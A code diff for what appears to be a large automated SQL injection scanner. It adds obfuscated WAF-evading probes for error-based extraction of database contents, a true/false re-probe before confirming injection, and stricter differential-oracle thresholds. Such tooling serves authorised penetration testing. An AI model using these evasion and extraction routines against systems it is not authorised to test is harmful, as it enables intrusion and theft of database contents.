@@ -39310,6 +39310,13 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                                 # PCV then sends SUBSTRING/LENGTH canary probes that never touch
                                 # application state → gap=0 → "no-gap-above-threshold" every run.
                                 _bdet_dbms._pcv_verified = True
+                                # PCV-INDEPENDENCE-FIX: Flag that _pcv_verified was set by the
+                                # detection phase (not by an actual PCV run). _inline_pcv_check
+                                # Shortcut A reads this flag and, when True, runs a quick
+                                # independent differential re-probe before fully bypassing PCV,
+                                # satisfying the requirement that every guard makes its own
+                                # verification decision independent of detection phase results.
+                                _bdet_dbms._pcv_verified_by_detection = True
                                 _bdet_dbms._fp_guards_preconfirmed = _diff_early_fpg_ok
                                 _bdet_dbms._fp_guards_confidence = 1.0 if _diff_early_fpg_ok else float(confidence)
                                 # BUG-PCV-FALSE-PAYLOAD FIX: Store the original (pre-mutation)
@@ -55198,25 +55205,50 @@ class Scanner:
                         LOG.debug("[ErrorExtract] UTL_INADDR test error: %s", _utl_err)
                 LOG.info("[ErrorExtract] UTL_INADDR fallback also failed — no Oracle error extraction available")
             
+            # BUG-ERREXTRACT-VISIBILITY-OBFUSC FIX: An unobfuscated probe blocked by WAF
+            # does NOT mean error extraction is impossible. The primary test above sends a
+            # PLAIN payload (no variation, no obfuscation) that modern WAFs trivially block.
+            # The actual extraction loop ALWAYS applies heavy variation + _obfuscate_extraction_cond
+            # + apply_sql_noise. We must test with an obfuscated probe before concluding that
+            # error visibility is impossible; if the obfuscated probe passes the WAF and the
+            # error pattern is visible in the response, extraction CAN proceed.
+            LOG.info("[ErrorExtract] Unobfuscated probe blocked — retrying with obfuscated probe...")
+            _obf_test_payload = _extractor.build_payload(_dbms, "'test'", 1)
+            if _prefix and not _obf_test_payload.startswith(_prefix):
+                _obf_test_payload = _prefix + _obf_test_payload
+            if not _obf_test_payload.endswith(('-- -', '#', '-#')):
+                _obf_test_payload = _obf_test_payload + _suffix
+            _obf_test_payload = apply_heavy_variation(_obf_test_payload, 9999, data_fmt=enum.data_fmt)
+            _obf_test_payload = _obfuscate_extraction_cond(_obf_test_payload, 9999)
+            _obf_test_payload = apply_sql_noise(_obf_test_payload, 9999)
+            _obf_test_fp = await _send_error_payload(_obf_test_payload)
+            if _obf_test_fp:
+                _obf_body = (_safe_decode_body(_obf_test_fp, encoding="utf-8", errors="ignore", func_name="extraction")
+                             if isinstance(_obf_test_fp.body, bytes) else str(_obf_test_fp.body))
+                if _extractor.extract_char(_obf_body):
+                    LOG.info("[ErrorExtract] ✓ Obfuscated probe works — proceeding with obfuscated extraction")
+                    return True
+
             LOG.warning("[ErrorExtract] ✗ Error messages filtered/suppressed by WAF")
             return False
-        
-        # Test error visibility first
-        # BUG-ROOT-CAUSE-2 FIX: The original code returned False immediately if error 
-        # visibility test failed. But _test_error_visibility() only tests if error MESSAGES
-        # are visible/extractable from responses. It doesn't test whether the injection itself
-        # works or whether the database supports error-based queries.
-        # A FALSE return from _test_error_visibility means:
-        #   - Error messages might be filtered/suppressed
-        #   - Error messages might be wrapped differently
-        #   - Oracle might require UTL_INADDR fallback
-        # It does NOT mean error-based extraction is impossible.
-        # Fix: Attempt extraction regardless of visibility test result.
-        # Only log a warning about potential filtering, but continue to extraction phase.
+
+        # Test error visibility (plain probe first, obfuscated probe as fallback).
+        # BUG-ERREXTRACT-ABORT-ON-TOTAL-FAILURE FIX (replaces BUG-ROOT-CAUSE-2 FIX):
+        # The prior "BUG-ROOT-CAUSE-2 FIX" code continued extraction even when BOTH
+        # the plain and obfuscated probes failed to produce a visible error pattern.
+        # This caused garbage extraction: heavily obfuscated probes returned WAF block
+        # pages containing content that matched ERROR_EXTRACTORS patterns (especially the
+        # generic r"~(.+?)~" tilde catch-all), producing '.' for every position and
+        # resulting in database names like '............................................]'.
+        # Root cause: allowing extraction when no probe can elicit a recognizable error
+        # pattern. Fix: abort error-based extraction when _test_error_visibility() returns
+        # False (both plain and obfuscated probes confirmed blocked/invisible). The caller
+        # will fall through to the next extraction technique (blind boolean, timing, etc.).
         _error_visibility_ok = await _test_error_visibility()
         if not _error_visibility_ok:
-            LOG.warning("[ErrorExtract] Error visibility test failed — attempting extraction anyway "
-                       "(may encounter filtering or wrapped error messages)")
+            LOG.warning("[ErrorExtract] Error visibility confirmed failed (both plain and obfuscated probes) — "
+                       "aborting error-based extraction to prevent garbage output")
+            return
         
         # Extract string using error-based extraction
         async def _extract_string_error(query, max_len=64, label=""):
@@ -112152,7 +112184,71 @@ class TechniqueCascadeEngine:
                 pass
 
         # Early Shortcut A: only bypass PCV when an oracle already completed it (det._pcv_verified)
+        # PCV-INDEPENDENCE-FIX: When _pcv_verified was set by the detection phase
+        # (not a real PCV run), perform a quick independent differential re-probe before
+        # accepting the shortcut.  Each guard must make its own verification decision and
+        # must not inherit PASS/FAIL from detection.  On WAF/DIFFERENTIAL targets, canary
+        # probes are blocked, so we use differential comparison (true-payload vs false-payload)
+        # as the independent signal.  If the re-probe shows no difference, fall through to
+        # full PCV A-E.  On exception, fail-open to preserve sensitivity.
+        _shortcut_a_allowed = False
         if _already_pcv_verified_early and det is not None:
+            _pcv_verified_by_det = bool(getattr(det, '_pcv_verified_by_detection', False))
+            if _pcv_verified_by_det:
+                # Independent re-probe: compare true/false payloads again with new nonces
+                _pcv_reprobe_passed = False
+                try:
+                    _repr_true_sfx  = getattr(det, 'payload', None) or ''
+                    _repr_false_sfx = getattr(det, '_false_payload_orig', None) or ''
+                    if _repr_true_sfx and _repr_false_sfx and _repr_true_sfx != _repr_false_sfx:
+                        import random as _repr_rand
+                        _repr_url_t = url + ("&" if "?" in url else "?") + f"_pcvr={_repr_rand.randint(10000,99999)}"
+                        _repr_url_f = url + ("&" if "?" in url else "?") + f"_pcvr={_repr_rand.randint(10000,99999)}"
+                        _repr_tc = list(getattr(det, 'tamper_chain', None) or [])
+                        _repr_fp_t = await _send_injected(
+                            self.engine, method, _repr_url_t, data, data_fmt,
+                            param, original + _repr_true_sfx, _repr_tc)
+                        _repr_fp_f = await _send_injected(
+                            self.engine, method, _repr_url_f, data, data_fmt,
+                            param, original + _repr_false_sfx, _repr_tc)
+                        if _repr_fp_t is not None and _repr_fp_f is not None:
+                            _repr_both_blocked = (
+                                WAFBlockDiscriminator.is_waf_block(_repr_fp_t) and
+                                WAFBlockDiscriminator.is_waf_block(_repr_fp_f))
+                            if not _repr_both_blocked:
+                                _repr_emd = WassersteinResponseOracle.wasserstein1(
+                                    _repr_fp_t.body, _repr_fp_f.body)
+                                _repr_len_d = abs(_repr_fp_t.content_length - _repr_fp_f.content_length)
+                                _repr_stat_d = (getattr(_repr_fp_t, 'status_code', 0) !=
+                                                getattr(_repr_fp_f, 'status_code', 0))
+                                _pcv_reprobe_passed = (
+                                    _repr_emd > 0.015 or _repr_stat_d or _repr_len_d > 100)
+                            else:
+                                # Both WAF-blocked identically — no discriminating signal
+                                _pcv_reprobe_passed = False
+                        else:
+                            # Network error on re-probe: fail-open
+                            _pcv_reprobe_passed = True
+                    else:
+                        # No distinct false payload stored — can't verify independently
+                        # Fall through to full PCV A-E
+                        _pcv_reprobe_passed = False
+                except Exception:
+                    _pcv_reprobe_passed = True  # fail-open
+                if _pcv_reprobe_passed:
+                    LOG.debug("[PCV-INDEPENDENCE] Shortcut A independent re-probe CONFIRMED — "
+                              "accepting detection-phase pre-verification")
+                    _shortcut_a_allowed = True
+                else:
+                    LOG.debug("[PCV-INDEPENDENCE] Shortcut A independent re-probe disagrees "
+                              "with detection — falling through to full PCV A-E")
+                    _shortcut_a_allowed = False
+            else:
+                # _pcv_verified was NOT set by detection (set by a prior real PCV run)
+                # Shortcut is always allowed in this case
+                _shortcut_a_allowed = True
+
+        if _shortcut_a_allowed and _already_pcv_verified_early and det is not None:
             _early_tech = getattr(det, 'technique', tech) or tech
             _early_dbms = getattr(det, 'dbms', dbms) or dbms
             print(f"[!!] SQL INJECTION CONFIRMED [{_early_tech}] {_early_dbms} "
@@ -141715,14 +141811,32 @@ class SafeModeVerifier:
                     _emd_avg  = _diff_emd_sum / _n_diff_valid
                     _emd_med  = sorted(_diff_emds)[len(_diff_emds) // 2] if _diff_emds else 0.0
                     _len_avg  = _diff_len_sum / _n_diff_valid
-                    diff_capable = _diff_rounds >= 3 or _diff_stat_sum
+                    # BUG-DIFF-ORACLE-LEND-ONLY FIX: Content-length variation alone (len_d > 150)
+                    # must NOT qualify rounds for DIFFERENTIAL oracle.  CDN nonce tokens, A/B
+                    # test payloads, and cache-stamp fields routinely produce len_d > 150 on
+                    # EVERY request pair regardless of SQL injection.  When emd_avg <= 0.010
+                    # (well below the per-round EMD threshold of 0.018), all differential rounds
+                    # were triggered exclusively by len_d — no distributional signal exists.
+                    # Selecting DIFFERENTIAL in that case misrepresents CDN noise as a usable
+                    # oracle, causing downstream detection to use DIFFERENTIAL thresholds (0.800)
+                    # when the target may have genuine FULL-mode capability.
+                    # Fix: require emd_avg > 0.010 (genuine distributional divergence) OR a
+                    # confirmed status-code change.  Content-length rounds count toward _diff_rounds
+                    # but cannot satisfy diff_capable alone.
+                    _diff_emd_rounds = sum(1 for _emd_v in _diff_emds if _emd_v > 0.018)
+                    diff_capable = (
+                        (_diff_rounds >= 3 and (_emd_avg > 0.010 or _diff_emd_rounds >= 2)) or
+                        _diff_stat_sum
+                    )
                     if diff_capable:
                         recs.append(
-                            f"Differential oracle active (emd_med={_emd_med:.4f} rounds={_diff_rounds}/5 "
+                            f"Differential oracle active (emd_med={_emd_med:.4f} emd_avg={_emd_avg:.4f} "
+                            f"emd_rounds={_diff_emd_rounds}/5 rounds={_diff_rounds}/5 "
                             f"status_diff={_diff_stat_sum})  scanning in DIFFERENTIAL mode")
                     else:
                         LOG.debug(f"[SafeMode] Differential failed {_diff_rounds}/5 rounds "
-                                  f"emd_avg={_emd_avg:.4f} emd_med={_emd_med:.4f}")
+                                  f"emd_avg={_emd_avg:.4f} emd_med={_emd_med:.4f} "
+                                  f"emd_rounds={_diff_emd_rounds} (len_d-only rounds excluded)")
                 except Exception as _diff_e:
                     LOG.debug(f"Differential capability probe failed: {_diff_e}")
 
@@ -142047,17 +142161,29 @@ class SafeModeVerifier:
                             if _sw_emd > 0.018 or _sw_len_d > 150 or _sw_stat_d:
                                 _silwaf_diff_rounds += 1
                             await asyncio.sleep(0.15)
-                        _silwaf_diff_capable = _silwaf_diff_rounds >= 3
+                        # BUG-DIFF-ORACLE-LEND-ONLY FIX (silent-WAF path): Same fix as
+                        # the 403/WAF branch above.  Require emd_avg > 0.010 or >= 2 rounds
+                        # with genuine EMD signal, not just content-length variation.
+                        _sw_n_valid = max(len(_silwaf_diff_emds), 1)
+                        _sw_emd_avg = sum(_silwaf_diff_emds) / _sw_n_valid
+                        _sw_emd_rounds = sum(1 for _v in _silwaf_diff_emds if _v > 0.018)
+                        _silwaf_diff_capable = (
+                            (_silwaf_diff_rounds >= 3 and
+                             (_sw_emd_avg > 0.010 or _sw_emd_rounds >= 2))
+                        )
                     except Exception as _sw_e:
                         LOG.debug(f"[SafeMode] Silent WAF differential probe failed: {_sw_e}")
                     if _silwaf_diff_capable:
                         oracle_mode = OracleMode.DIFFERENTIAL
                         can_scan    = True
-                        warnings.append(f"Silent WAF  DIFFERENTIAL oracle confirmed ({_silwaf_diff_rounds}/5 rounds)")
+                        warnings.append(f"Silent WAF  DIFFERENTIAL oracle confirmed "
+                                        f"({_silwaf_diff_rounds}/5 rounds emd_avg={_sw_emd_avg:.4f})")
                     else:
                         oracle_mode = OracleMode.TIMING_ONLY
                         can_scan    = True
-                        warnings.append(f"Silent WAF blocks all payloads uniformly  TIMING_ONLY oracle ({_silwaf_diff_rounds}/5 diff rounds)")
+                        warnings.append(f"Silent WAF blocks all payloads uniformly  TIMING_ONLY oracle "
+                                        f"({_silwaf_diff_rounds}/5 diff rounds, emd-only rounds="
+                                        f"{_sw_emd_rounds} insufficient)")
                 elif _is_5xx:
                     oracle_mode = OracleMode.FULL
                     can_scan    = True
